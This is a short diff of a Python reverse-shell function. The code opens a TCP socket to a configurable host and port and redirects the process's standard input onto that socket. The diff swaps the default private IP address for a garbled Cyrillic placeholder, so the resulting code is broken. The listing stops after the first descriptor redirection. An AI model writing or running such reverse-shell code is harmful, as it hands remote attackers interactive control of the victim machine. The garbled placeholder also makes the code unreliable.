@@ -1,7 +1,7 @@
 import socket
 import os
 
-def reverse_shell(target_ip='172.16.0.10', target_port=1234):
+def reverse_shell(target_ip='АЙППИИ', target_port=1234):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((target_ip, target_port))
     os.dup2(s.fileno(), 0)  
